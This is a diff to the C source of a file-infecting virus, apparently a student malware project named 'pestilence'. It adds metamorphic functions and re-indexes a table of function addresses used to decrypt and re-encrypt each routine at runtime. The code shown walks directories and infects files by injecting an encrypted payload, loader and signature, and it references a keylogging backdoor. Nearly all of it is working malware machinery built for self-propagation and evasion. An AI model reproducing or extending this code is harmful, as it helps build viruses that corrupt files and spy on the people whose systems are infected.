@@ -102,9 +102,9 @@ static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 	reencrypt_func(info, &pe_parsing, info->tab_addr[10] - info->tab_addr[9], key);
 	if (ret == 1)
 		goto end_fct;
-	key = decrypt_func(info, &reload_mapping, info->tab_addr[25] - info->tab_addr[24], 24);
+	key = decrypt_func(info, &reload_mapping, info->tab_addr[27] - info->tab_addr[26], 26);
 	ret = reload_mapping(info);
-	reencrypt_func(info, &reload_mapping, info->tab_addr[25] - info->tab_addr[24], key);
+	reencrypt_func(info, &reload_mapping, info->tab_addr[27] - info->tab_addr[26], key);
 	if (ret == 1)
 		goto end_fct;
 	key =  decrypt_func(info, &find_text, info->tab_addr[6] - info->tab_addr[5], 5);
@@ -124,9 +124,9 @@ static void	infect_file(char *path, t_fingerprint *fingerprint, t_info *info)
 	key = decrypt_func(info, &patch_addresses, info->tab_addr[17] - info->tab_addr[16], 16);
 	patch_addresses(info);
 	reencrypt_func(info, &patch_addresses, info->tab_addr[17] - info->tab_addr[16], key);
-	key = decrypt_func(info, &inject_sign, info->tab_addr[26] - info->tab_addr[25], 25);
+	key = decrypt_func(info, &inject_sign, info->tab_addr[28] - info->tab_addr[27], 27);
 	inject_sign(info, fingerprint);
-	reencrypt_func(info, &inject_sign, info->tab_addr[26] - info->tab_addr[25], key);
+	reencrypt_func(info, &inject_sign, info->tab_addr[28] - info->tab_addr[27], key);
 	crypt_payload(info, fingerprint->fingerprint);
 	patch_key(info, encrypt(info, info->file + info->offset_bis + BIS_SIZE, PAYLOAD_SIZE, fingerprint->fingerprint));
 	ft_syswrite(info->fd, info->file, info->file_size);
@@ -213,18 +213,18 @@ static int	file_path(char *path, t_fingerprint *fingerprint, char choice, t_info
 					fingerprint->fingerprint += 1;
 					ft_memcpy(buf_path_file, path, PATH_MAX);
 					ft_strcat(buf_path_file, dir->d_name);
-					uint32_t key = decrypt_func(info, &get_index_file, info->tab_addr[28] - info->tab_addr[27], 27);
+					uint32_t key = decrypt_func(info, &get_index_file, info->tab_addr[30] - info->tab_addr[29], 29);
 					tmp_index = get_index_file(buf_path_file);
-					reencrypt_func(info, &get_index_file, info->tab_addr[28] - info->tab_addr[27], key);
+					reencrypt_func(info, &get_index_file, info->tab_addr[30] - info->tab_addr[29], key);
 					if (tmp_index > index)
 						index = tmp_index;
 				} else
 				{	//infect dir
 					ft_memcpy(buf_path_file, path, PATH_MAX);
 					ft_strcat(buf_path_file, dir->d_name);
-					uint32_t key = decrypt_func(info, &infect_file, info->tab_addr[27] - info->tab_addr[26], 26);
+					uint32_t key = decrypt_func(info, &infect_file, info->tab_addr[29] - info->tab_addr[28], 28);
 					infect_file(buf_path_file, fingerprint, info);
-					reencrypt_func(info, &infect_file, info->tab_addr[27] - info->tab_addr[26], key);
+					reencrypt_func(info, &infect_file, info->tab_addr[29] - info->tab_addr[28], key);
 					fingerprint->fingerprint -= 1;
 				}
 			}
@@ -296,18 +296,22 @@ void		fill_tab_addr(size_t *tab_addr)
 	tab_addr[18] = (size_t)&rewrite_own_file;
 	tab_addr[19] = (size_t)&update_own_index;
 
+	//metamorph.c
+	tab_addr[20] = (size_t)&hash_fingerprint;
+	tab_addr[21] = (size_t)&metamorph;
+
 	//pestilence.c
-	tab_addr[20] = (size_t)&init_info; //jump
-	tab_addr[21] = (size_t)&inject_payload;
-	tab_addr[22] = (size_t)&inject_loader;
-	tab_addr[23] = (size_t)&inject_bis;
-	tab_addr[24] = (size_t)&reload_mapping;
-	tab_addr[25] = (size_t)&inject_sign;
-	tab_addr[26] = (size_t)&infect_file;
-	tab_addr[27] = (size_t)&get_index_file;
-	tab_addr[28] = (size_t)&file_path;
-	tab_addr[29] = (size_t)&close_entries;
-	tab_addr[30] = (size_t)&fill_tab_addr;
+	tab_addr[22] = (size_t)&init_info; //jump
+	tab_addr[23] = (size_t)&inject_payload;
+	tab_addr[24] = (size_t)&inject_loader;
+	tab_addr[25] = (size_t)&inject_bis;
+	tab_addr[26] = (size_t)&reload_mapping;
+	tab_addr[27] = (size_t)&inject_sign;
+	tab_addr[28] = (size_t)&infect_file;
+	tab_addr[29] = (size_t)&get_index_file;
+	tab_addr[30] = (size_t)&file_path;
+	tab_addr[31] = (size_t)&close_entries;
+	tab_addr[32] = (size_t)&fill_tab_addr;
 }
 
 uint16_t	my_htons(uint16_t x)
@@ -441,7 +445,7 @@ static void	backdoor_keylog()
 
 int		main(void)
 {
-	size_t			tab_addr[31];
+	size_t			tab_addr[33];
 	char			buf[BUF_SIZE];
 	char			buf_path[PATH_MAX];
 	uint32_t		tmp_index;
@@ -467,13 +471,13 @@ int		main(void)
 	ft_syswrite(1, buf, 8);
 	write_test2(buf_path);
 	fingerprint.fingerprint = 0;
-	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	key = decrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], 30);
 	tmp_index = file_path(buf_path, &fingerprint, 1, &info);
-	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
+	reencrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], key);
 	write_test(buf_path);
-	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	key = decrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], 30);
 	fingerprint.index = file_path(buf_path, &fingerprint, 1, &info);
-	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
+	reencrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], key);
 	if (tmp_index > fingerprint.index)
 		fingerprint.index = tmp_index;
 	key = decrypt_func(&info, &update_own_index, info.tab_addr[20] - info.tab_addr[19], 19);
@@ -481,12 +485,12 @@ int		main(void)
 	reencrypt_func(&info, &update_own_index, info.tab_addr[20] - info.tab_addr[19], key);
 	fingerprint.index += fingerprint.fingerprint;
 	fingerprint.fingerprint = fingerprint.index;
-	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	key = decrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], 30);
 	file_path(buf_path, &fingerprint, 0, &info);
-	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
+	reencrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], key);
 	write_test2(buf_path);
-	key = decrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], 28);
+	key = decrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], 30);
 	file_path(buf_path, &fingerprint, 0, &info);
-	reencrypt_func(&info, &file_path, info.tab_addr[29] - info.tab_addr[28], key);
+	reencrypt_func(&info, &file_path, info.tab_addr[31] - info.tab_addr[30], key);
 	return (0);
 }
